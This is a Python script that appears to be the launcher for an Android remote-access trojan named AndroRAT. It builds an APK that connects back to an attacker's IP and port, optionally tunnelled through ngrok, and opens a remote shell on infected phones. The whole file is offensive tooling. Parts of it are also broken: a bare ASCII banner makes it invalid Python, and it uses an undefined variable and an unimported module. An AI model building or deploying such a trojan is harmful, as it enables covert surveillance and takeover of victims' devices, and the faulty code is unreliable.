from utils import *
import argparse
import sys
import platform
from pyngrok import ngrok,conf

clearDirec()

   ##     ##  ##   ####     #####      ##     ######  
  ####    ### ##   ## ##    ##  ##    ####      ##    
 ##  ##   ######   ##  ##   ##  ## a  ##  ##     ##    
 ######   ######   ##  ##   #####    ######     ##    
 ##  ##   ## ###   ##  ##   ####     ##  ##     ##    
 ##  ##   ##  ##   ## ##    ## ##    ##  ##     ##    
 ##  ##   ##  ##   ####     ##  ##   ##  ##     ##                                                      


parser = argparse.ArgumentParser(usage="%(prog)s [--build][--shell][-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
args = parser.parse_args()

if args.build:
    port = args.port
    icon=True if args.icon else None 
    if args.ngrok:
        conf.get_default().monitor_thread = False
        port = 8000 if not port_ else port_
        tcp_tunnel = ngrok.connect(port,"tcp")
        ngrok_process = ngrok.get_ngrok_process()
        domain,port = tcp_tunnel.public_url[6:].split(":")
        ip = socket.gethostbyname(domain)
        print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
        build(ip,port,args.output,True,port_,icon)
    else:
        if args.ip and args.port:
            build(args.ip,port_,args.output,False,None,icon)
        else:
            print(stdOutput("error")+"\033[1mArguements Missing")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port)
    else:
        print(stdOutput("error")+"\033[1mAruguements Missing")
        


